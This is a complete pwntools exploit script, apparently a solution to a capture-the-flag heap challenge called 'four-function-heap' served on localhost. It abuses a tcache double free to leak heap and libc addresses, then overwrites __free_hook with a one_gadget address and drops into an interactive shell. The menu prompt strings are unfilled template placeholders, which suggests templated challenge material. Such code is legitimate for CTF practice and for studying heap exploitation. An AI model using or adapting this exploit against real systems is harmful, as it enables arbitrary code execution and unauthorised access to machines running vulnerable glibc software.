from pwn import *

def add(size, s):
    p.recvuntil('{{prompts.menu}}: ')
    p.sendline('1')
    p.recvuntil('{{prompts.index}}: ')
    p.sendline('0')
    p.recvuntil('{{prompts.size}}: ')
    p.sendline(str(size))
    p.recvuntil('{{prompts.read}}: ')
    p.sendline(s)

def delete():
    p.recvuntil('{{prompts.menu}}: ')
    p.sendline('2')
    p.recvuntil('{{prompts.index}}: ')
    p.sendline('0')

def show():
    p.recvuntil('{{prompts.menu}}: ')
    p.sendline('3')
    p.recvuntil('{{prompts.index}}: ')
    p.sendline('0')
    return p.recvline()[:-1].ljust(8, b'\x00')

p = remote('localhost', 7777)
e = ELF('./four-function-heap')
libc = ELF('./libc.so.6')

one_gadget = 0x4f322

add(0x248, '')
delete()
delete()
heap = u64(show()) - 0x250
print(hex(heap))

payload = p64(0) * 4
payload += p64(0xff000000)
payload += p64(0) * 3 
payload += p64(0) * 16
payload += p64(heap + 0xc0) * 4     # 0x120

# payload = p64(0) * 4
# payload += p64(0xff000000)
# payload += p64(0) * 3 
# payload += p64(0) * 6
# payload += p64(heap + 0x70) * 4     # 0x80

add(0x248, p64(heap))
add(0x248, '')
add(0x248, payload)
delete()
libc.address = u64(show()) - 0x60 - 0x3ebc40
print(hex(libc.address))

# add(0x78, p64(libc.symbols['__free_hook']) * 4)
# add(0x88, p64(libc.address + one_gadget))
# delete()

add(0x118, p64(libc.symbols['__free_hook']) * 4)
add(0x128, p64(libc.address + one_gadget))
delete()

p.interactive()
